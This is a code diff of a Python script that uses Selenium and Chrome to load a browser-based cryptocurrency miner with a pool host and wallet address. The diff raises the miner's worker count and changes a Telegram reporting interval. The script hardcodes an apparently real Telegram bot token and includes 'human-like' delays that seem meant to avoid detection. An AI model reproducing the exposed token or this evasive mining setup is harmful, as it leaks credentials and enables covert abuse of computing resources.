@@ -17,7 +17,7 @@ except:
 # === Telegram Bot Setup ===
 BOT_TOKEN = "8163512363:AAH7dF8aDr-NHYhF9JhZD62-zHSQ8Naz7uY"
 CHAT_ID = "7118252117"
-SEND_EVERY = 5  # seconds
+SEND_EVERY = 10  # seconds
 
 # === Chrome Driver Setup ===
 chrome_driver_path = "/usr/local/bin/chromedriver"
@@ -68,7 +68,7 @@ try:
     def human_like_delay(min_sec=1, max_sec=3):
         time.sleep(random.uniform(min_sec, max_sec))
 
-    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=XbwZSCiazX5A3Hbm1tZhWFVzpwy5cRPXcJ&password=c%3DDASH&workers=16"
+    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=XbwZSCiazX5A3Hbm1tZhWFVzpwy5cRPXcJ&password=c%3DDASH&workers=48"
     driver.get(base_url)
     human_like_delay()
 
